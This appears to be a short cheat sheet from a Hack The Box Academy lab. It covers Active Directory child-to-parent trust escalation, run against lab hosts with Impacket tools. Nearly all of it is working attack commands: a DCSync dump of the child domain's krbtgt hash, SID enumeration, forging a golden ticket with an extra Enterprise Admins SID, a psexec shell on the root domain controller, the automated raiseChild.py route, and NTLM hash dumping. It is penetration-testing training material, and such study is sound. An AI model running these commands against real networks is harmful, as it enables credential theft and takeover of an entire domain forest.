
Information needed
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

 Performing DCSync with secretsdump.py
 ```shell-session
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

Performing SID Brute Forcing using lookupsid.py
```shell-session
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

Looking for domain SID
```shell-session
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```

Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```shell-session
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

Construct golden ticket [Tool Source](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```shell-session
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

Set ccache file
```shell-session
export KRB5CCNAME=hacker.ccache
```

Gain shell via psexec
```shell-session
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Automated Attack via impacket
```shell-session
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```


Grab NTLM Hash for specified user with local ccache
```
secretsdump.py hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-ntlm -just-dc-user bross
```

